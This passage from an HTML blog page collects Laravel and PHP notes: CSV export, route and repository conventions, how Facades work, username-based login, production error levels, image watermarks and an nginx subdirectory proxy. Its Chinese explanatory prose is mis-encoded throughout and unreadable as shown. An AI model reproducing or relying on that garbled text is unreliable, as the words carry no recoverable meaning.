(<span class="params">$excel</span>) <span class="title">use</span>(<span class="params">$params</span>)</span>&#123;</span><br><span class="line">        $excel-&gt;sheet(<span class="string">'score'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">$sheet</span>) <span class="title">use</span>(<span class="params">$params</span>)</span>&#123;</span><br><span class="line">            $sheet-&gt;rows($params);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)-&gt;<span class="keyword">export</span>(<span class="string">'csv'</span>);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32002</span></span><br><span class="line">æŒ‰ç…§ semver https:<span class="comment">//semver.org/lang/zh-CN/ çš„è§„åˆ™ï¼Œä¸»ç‰ˆæœ¬å·æœ¬æ¥å°±æ˜¯åšä¸å…¼å®¹ API ä¿®æ”¹çš„ï¼Œå‡çº§äº†ä¸»ç‰ˆæœ¬å·ï¼Œè¯­æ³•å½“ç„¶ä¸ä¸€æ ·äº†ã€‚è¿™ä¸ç®—æ˜¯å‘ï¼Œåªæ˜¯ä½ ä¸äº†è§£è€Œå·²ã€‚</span></span><br><span class="line">https:<span class="comment">//github.com/rap2hpoutre/fast-excel  maatwebsite/excel æ„Ÿè§‰å¤ªè€—å†…å­˜äº†</span></span><br></pre></td></tr></table></figure>
<h3 id="é¡¹ç›®å¼€å‘è§„èŒƒ"><a href="#é¡¹ç›®å¼€å‘è§„èŒƒ" class="headerlink" title="é¡¹ç›®å¼€å‘è§„èŒƒ"></a>é¡¹ç›®å¼€å‘è§„èŒƒ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">å¸¸ç”¨çš„ HTTP åŠ¨è¯æœ‰ä¸‹é¢äº”ä¸ªã€‚</span><br><span class="line"></span><br><span class="line">GETï¼ˆSELECTï¼‰ï¼šä»æœåŠ¡å™¨å–å‡ºèµ„æºï¼ˆä¸€é¡¹æˆ–å¤šé¡¹ï¼‰ã€‚</span><br><span class="line">POSTï¼ˆCREATEï¼‰ï¼šåœ¨æœåŠ¡å™¨æ–°å»ºä¸€ä¸ªèµ„æºã€‚</span><br><span class="line">PUTï¼ˆUPDATEï¼‰ï¼šåœ¨æœåŠ¡å™¨æ›´æ–°èµ„æºï¼ˆå®¢æˆ·ç«¯æä¾›æ”¹å˜åçš„å®Œæ•´èµ„æºï¼‰ã€‚</span><br><span class="line">PATCHï¼ˆUPDATEï¼‰ï¼šåœ¨æœåŠ¡å™¨æ›´æ–°èµ„æºï¼ˆå®¢æˆ·ç«¯æä¾›æ”¹å˜çš„å±æ€§ï¼‰ã€‚</span><br><span class="line">DELETEï¼ˆDELETEï¼‰ï¼šä»æœåŠ¡å™¨åˆ é™¤èµ„æºã€‚</span><br><span class="line">æ‰€æœ‰ URL å¿…é¡» æ˜¯å…¨å°å†™ï¼Œæ‰€æœ‰çš„è·¯ç”±éƒ½è¦ç”¨ name</span><br><span class="line"></span><br><span class="line"> Route::get(<span class="string">'user/create'</span>,<span class="string">'UserController@create'</span>)-&gt;name(<span class="string">'admin.user.create'</span>);</span><br><span class="line">ä¸€ä¸ªæ˜¯æ‰“å¼€ create é¡µé¢çš„è¯·æ±‚ï¼Œä¸€ä¸ªæ˜¯ create æ•°æ®çš„è¯·æ±‚ï¼Œå…¶ä¸­çš„è·¯ç”±è§„èŒƒå¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">è·¯ç”±é‡‡ç”¨ reseful API çš„è®¾è®¡è§„èŒƒ</span><br><span class="line"></span><br><span class="line">        Route::get(<span class="string">'member/create'</span>, <span class="string">'MemberController@create'</span>)-&gt;name(<span class="string">'admin.member.create'</span>);</span><br><span class="line">        Route::post(<span class="string">'member/store'</span>, <span class="string">'MemberController@store'</span>)-&gt;name(<span class="string">'admin.member.store'</span>);</span><br><span class="line">ORM çš„è®¾è®¡è§„èŒƒ</span><br><span class="line"></span><br><span class="line">æ¡†æ¶çš„ ORM åªå•çº¯çš„åšæ¨¡å‹å…³è”ä½¿ç”¨ï¼Œå¦å¤–æ–°å»º Repsitory å±‚åšæ•°æ®åº“çš„é€»è¾‘å¤„ç†ï¼Œ</span><br><span class="line"></span><br><span class="line">Repsitory çš„å‘½åé‡‡ç”¨é©¼å³°æ³•å‘½ä»¤è§„èŒƒï¼Œæ¯”å¦‚</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Repository\Admin;</span><br><span class="line">use App\Models\User;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserRepository</span> </span>&#123;</span><br><span class="line">Controller çš„è®¾è®¡è§„èŒƒ</span><br><span class="line"></span><br><span class="line">æ•°æ®éªŒè¯åœ¨ request å±‚è¿›è¡Œå¤„ç†ï¼Œä¿è¯è¿›è¡Œæ§åˆ¶å™¨çš„æ•°æ®æ˜¯å¹²å‡€çš„ã€‚</span><br><span class="line">å¯¹äºæ•°æ®çš„å¤„ç†åˆ™è°ƒç”¨å¯¹åº”çš„ Repsitory å±‚å¤„ç†ï¼Œæ§åˆ¶å™¨åªåšå“åº”å’Œè¿”å›å¯¹åº”çš„æ•°æ®ã€‚https:<span class="comment">//learnku.com/articles/32141</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-ä¸­-Facade"><a href="#Laravel-ä¸­-Facade" class="headerlink" title="Laravel ä¸­ Facade"></a>Laravel ä¸­ Facade</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">è¿™é‡Œ Route å°±æ˜¯ç”¨ Facade å®ç°ç±»æ–¹æ³• get çš„é™æ€è°ƒç”¨ã€‚</span><br><span class="line"></span><br><span class="line">Laravel ä¸­çš„ Facade è§£å†³ç±»ä»€ä¹ˆé—®é¢˜ï¼Ÿ</span><br><span class="line"></span><br><span class="line">åœ¨ php ä¸­ï¼Œå¾ˆå¤šæƒ…å†µéƒ½éœ€è¦ä½¿ç”¨ä¸€ä¸ªå®¹å™¨è·å–åˆ°æ‰€æœ‰çš„å¯¹è±¡ï¼Œç„¶åå†è°ƒç”¨æ”¹å¯¹è±¡çš„æ–¹æ³•ï¼Œè¿™æ ·åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™å°±ä¼šçœ‹åˆ°å¾ˆé•¿çš„ä¸€ä¸ªè°ƒç”¨é“¾ã€‚ä¾‹å¦‚:</span><br><span class="line">åœ¨ Yii2 ä¸­ï¼Œå‡ ä¹æ‰€æœ‰çš„ç³»ç»Ÿç±»éƒ½æ˜¯åœ¨ app å®¹å™¨å½“ä¸­ï¼Œå¯¹è¿™äº›ç³»ç»Ÿç±»è¿›è¡Œæ“ä½œéƒ½éœ€è¦æ‰§è¡Œ Yii::$app-&gt;route è·å–åˆ°ç±»å®ä¾‹ï¼Œç„¶ååœ¨æ‰§è¡Œæ–¹æ³• Yii::$app-&gt;route-&gt;get()ã€‚ä½†æ˜¯å¦‚æœç”¨ Facade å®ç°ä¹‹åçš„è°ƒç”¨å°±æ˜¯ Route::get()ã€‚è¿™æ ·çš„å†™æ³•æ˜¯çš„ä»£ç æ›´åŠ ç®€æ´ã€‚</span><br><span class="line"></span><br><span class="line">Laravel ä¸­ Facade æ˜¯æ€ä¹ˆå®ç°çš„ï¼Ÿ</span><br><span class="line"></span><br><span class="line">æ€è·¯æ˜¯é€šè¿‡__callStatic é­”æœ¯æ–¹æ³•å°†æ–¹æ³•è°ƒç”¨ä»£ç†åˆ°å®é™…çš„å¯¹è±¡æ–¹æ³•ä¸­å»ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">abstract <span class="class"><span class="keyword">class</span> <span class="title">Facade</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeRoot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::resolveFacadeInstance(<span class="keyword">static</span>::getFacadeAccessor());</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    protected <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveFacadeInstance</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_object($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="keyword">static</span>::$resolvedInstance[$name])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">static</span>::$resolvedInstance[$name];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::$resolvedInstance[$name] = <span class="keyword">static</span>::$app[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeAccessor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//å­ç±»è¿”å›ç±»å</span></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params">$method, $args</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $instance = <span class="keyword">static</span>::getFacadeRoot();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $instance) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'A facade root has not been set.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $instance-&gt;$method(...$args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Route</span> <span class="keyword">extends</span> <span class="title">Facade</span></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeAccessor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'router'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">æ ¹æ®æ¯ä¸ª Facade ä¸­æä¾›çš„ getFacadeAccessor è¿”å›å®é™…çš„å¯¹è±¡ç±»åï¼Œè·å–ç±»å¯¹è±¡ã€‚æ¯ä¸ªç±»å¯¹è±¡ä¸€æ—¦åˆ›å»ºï¼Œå°±æ”¾åœ¨ä¸€ä¸ªé™æ€æ•°ç»„ä¸­ï¼Œå› æ­¤åœ¨ä¸€æ¬¡è¯·æ±‚ä¸­æœ€å¤šåªä¼šè¢«åˆ›å»ºä¸€æ¬¡ã€‚</span><br><span class="line"></span><br><span class="line">æœ‰æ²¡æœ‰å…¶ä»–çš„å®ç°æ–¹å¼ï¼Ÿ</span><br><span class="line"></span><br><span class="line">ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®æ ¸å¿ƒå°±æ˜¯ä¸€ä¸ªé™æ€ä»£ç†çš„åŠŸèƒ½ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰å…¶ä»–çš„å®ç°æ–¹å¼äº†å‘¢ï¼Ÿ</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Facade</span></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> $instance;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeRoot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::resolveFacadeInstance(<span class="keyword">static</span>::getFacadeAccessor());</span><br><span class="line">    &#125;</span><br><span class="line">    protected <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveFacadeInstance</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_object($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="keyword">static</span>::$instance)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">static</span>::$instance;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::$instance = <span class="keyword">static</span>::$app[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params">$method, $args</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $instance = <span class="keyword">static</span>::getFacadeRoot();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $instance) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'A facade root has not been set.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $instance-&gt;$method(...$args);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Route</span> <span class="keyword">extends</span> <span class="title">Facade</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">å¯ä»¥çœ‹å‡ºï¼Œä¸Šé¢çš„æ–¹å¼ä¹Ÿèƒ½å¤Ÿå®ç°é™æ€ä»£ç†ï¼Œç±»ä¼¼äº Facade çš„åŠŸèƒ½ã€‚éƒ½æ˜¯é€šè¿‡é­”æœ¯æ–¹æ³•å®ç°ã€‚ä½œç”¨ä¸Šï¼Œéƒ½ç®€åŒ–äº†ä»£ç ç¼–å†™ã€‚</span><br><span class="line"></span><br><span class="line">ä¸¤ç§ä¸åŒå®ç°æ–¹å¼çš„åŒºåˆ«</span><br><span class="line"></span><br><span class="line">ç¬¬äºŒç§å®ç°æ–¹å¼æœ‰ä¸€ä¸ªå¾ˆå¤§çš„ç¼ºç‚¹ï¼Œé‚£å°±æ˜¯å¿…é¡»ç»§æ‰¿ Facade ç±»ã€‚PHP æœ¬èº«åªèƒ½ç»§æ‰¿ä¸€ä¸ªç±»ï¼Œæ‰€ä»¥ç¬¬äºŒç§å®ç°æ–¹å¼å¯¹äºä¸€äº›éœ€è¦ç»§æ‰¿å…¶ä»–ç±»çš„å¯¹è±¡æ˜¯ä¸é€‚åˆçš„ã€‚https:<span class="comment">//learnku.com/articles/31964</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-é»˜è®¤é‚®ç®±ç™»å½•æ”¹æˆç”¨æˆ·åç™»å½•"><a href="#Laravel-é»˜è®¤é‚®ç®±ç™»å½•æ”¹æˆç”¨æˆ·åç™»å½•" class="headerlink" title="Laravel é»˜è®¤é‚®ç®±ç™»å½•æ”¹æˆç”¨æˆ·åç™»å½•"></a>Laravel é»˜è®¤é‚®ç®±ç™»å½•æ”¹æˆç”¨æˆ·åç™»å½•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">é»˜è®¤çš„ï¼ŒLaravel ä½¿ç”¨çš„æ˜¯ Illuminate\Foundation\Auth\AuthenticatesUsers è¿™ä¸ª trait å®Œæˆç™»å½•åŠŸèƒ½çš„ã€‚é€šè¿‡è§‚å¯Ÿ AuthenticatesUsers çš„ä»£ç ï¼Œå‘ç°ä¸‹é¢ä¸€æ®µå¾ˆæœ‰æ„æ€çš„ä»£ç :</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">validateLogin</span>(<span class="params">Request $request</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;validate($request, [</span><br><span class="line">            $<span class="keyword">this</span>-&gt;username() =&gt; <span class="string">'required|string'</span>,</span><br><span class="line">            <span class="string">'password'</span> =&gt; <span class="string">'required|string'</span>,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">username</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'email'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯åº”ä¸º trait é‡Œå®šä¹‰äº†ç”¨æˆ·åå°±æ˜¯ emailï¼Œæ‰€ä»¥æ‰ä¼šä½¿å¾—éªŒè¯çš„æ—¶å€™é€šè¿‡ç”¨æˆ·é‚®ç®±éªŒè¯ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å®šä¹‰ä¸€ä¸ª traitï¼Œè¦†ç›– AuthenticatesUsers ä¸­çš„ username() æ–¹æ³•å³å¯å®ç°åç«¯ä»£ç é€šè¿‡ç”¨æˆ·åéªŒè¯ç™»å½•ã€‚</span><br><span class="line"></span><br><span class="line">æ–°å¢çš„ trait ä»£ç </span><br><span class="line"></span><br><span class="line">namespace App\Utils;</span><br><span class="line"></span><br><span class="line">use Illuminate\Foundation\Auth\AuthenticatesUsers <span class="keyword">as</span> LaravelAuthenticatesUsers;</span><br><span class="line">trait AuthenticatesUsers &#123;</span><br><span class="line">    use LaravelAuthenticatesUsers;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">username</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'name'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">å…¶å®è¿˜æœ‰å¦ä¸€ä¸ªç®€å•çš„ä¿®æ”¹æ–¹å¼ï¼Œç›´æ¥åœ¨ LoginController ä¸­æ–°å¢ username() æ–¹æ³•ã€‚ç”±äºå½“å‰å®šä¹‰æ–¹æ³•ä¼šè¦†ç›– trait çš„æ–¹æ³•ï¼Œå› æ­¤ä¹Ÿèƒ½è¾¾åˆ°ä¿®æ”¹çš„ç›®çš„ã€‚ä½†æ˜¯ä¼šç ´åç™»å½•ä»£ç çš„æ•´ä½“ä¸€è‡´æ€§ï¼Œæ‰€ä»¥æœ€å¥½è¿˜æ˜¯é€šè¿‡æ–°å¢ trait çš„æ–¹å¼å®ç°ã€‚</span><br><span class="line"></span><br><span class="line">åŒæ—¶è¦è®°å¾—ä¿®æ”¹å‰ç«¯ blade æ–‡ä»¶ä¸­å¯¹è¾“å…¥å‚æ•°çš„éªŒè¯ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨ç”¨æˆ·åç™»å½•äº† https:<span class="comment">//learnku.com/articles/32431</span></span><br></pre></td></tr></table></figure>
<h3 id="è®¾ç½®é”™è¯¯ç­‰çº§"><a href="#è®¾ç½®é”™è¯¯ç­‰çº§" class="headerlink" title="è®¾ç½®é”™è¯¯ç­‰çº§"></a>è®¾ç½®é”™è¯¯ç­‰çº§</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> /vendor/laravel/framework/src/Illuminate/Foundation/Bootstrap/HandleExceptions.php:<span class="number">12</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span>(<span class="params">Application $app</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$<span class="keyword">this</span>-&gt;app = $app;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($app-&gt;environment(<span class="string">'production'</span>)) &#123;</span><br><span class="line">            error_reporting(E_ERROR);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            error_reporting(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		set_error_handler([$<span class="keyword">this</span>, <span class="string">'handleError'</span>]);</span><br><span class="line"></span><br><span class="line">		set_exception_handler([$<span class="keyword">this</span>, <span class="string">'handleException'</span>]);</span><br><span class="line"></span><br><span class="line">		register_shutdown_function([$<span class="keyword">this</span>, <span class="string">'handleShutdown'</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( $app-&gt;environment(<span class="string">'production'</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			ini_set(<span class="string">'display_errors'</span>, <span class="string">'Off'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å›¾ç‰‡æ·»åŠ æ°´å°"><a href="#å›¾ç‰‡æ·»åŠ æ°´å°" class="headerlink" title="å›¾ç‰‡æ·»åŠ æ°´å°"></a>å›¾ç‰‡æ·»åŠ æ°´å°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> intervention/image</span><br><span class="line">åœ¨æˆ‘çš„æµ‹è¯•å›¾ç‰‡æ–‡ä»¶å¤¹ images é‡Œæœ‰ä¸€å¼ ä¸»å›¾ main.png å’Œä¸€å¼ æ°´å°å›¾ watermark.pngã€‚</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">addWatermark</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   $img = Image::make(public_path(<span class="string">'images/main.png'</span>));    </span><br><span class="line">   $img-&gt;insert(public_path(<span class="string">'watermark.png'</span>),<span class="string">'bottom-right'</span>,<span class="number">10</span>, <span class="number">10</span>); </span><br><span class="line">   $img-&gt;save();</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/32414</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-é…ç½®äºŒçº§ç›®å½•è®¿é—®"><a href="#Laravel-é…ç½®äºŒçº§ç›®å½•è®¿é—®" class="headerlink" title="Laravel é…ç½®äºŒçº§ç›®å½•è®¿é—®"></a>Laravel é…ç½®äºŒçº§ç›®å½•è®¿é—®</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">åŸŸå http:<span class="comment">//test.local æ­£å¸¸è®¿é—®ï¼Œå¯¹åº”é¡¹ç›®åœ°å€ E:/Project/Test</span></span><br><span class="line">åŸŸå http:<span class="comment">//test.local/module2 æ­£å¸¸è®¿é—®ï¼Œå¯¹åº”é¡¹ç›®åœ°å€ E:/Project/Module2</span></span><br><span class="line">åºŸè¯ä¸è¯´ä¸Šé…ç½®https:<span class="comment">//learnku.com/articles/32499</span></span><br><span class="line"></span><br><span class="line">Nginx é…ç½®æ–‡ä»¶ test_local.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen       <span class="number">80</span>;</span><br><span class="line">    server_name  test.local;</span><br><span class="line"></span><br><span class="line">    root E:<span class="regexp">/Project/</span>Test;</span><br><span class="line">    index  index.php index.html;</span><br><span class="line"></span><br><span class="line">    # è½¬å‘åˆ°ç«¯å£</span><br><span class="line">    location /module2/ &#123;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Real-PORT $remote_port;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Forwarded-Host $proxy_host;</span><br><span class="line">        proxy_set_header X-Forwarded-Port $proxy_port;</span><br><span class="line">        proxy_pass http:<span class="comment">//127.0.0.1:8081/;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri $uri/ 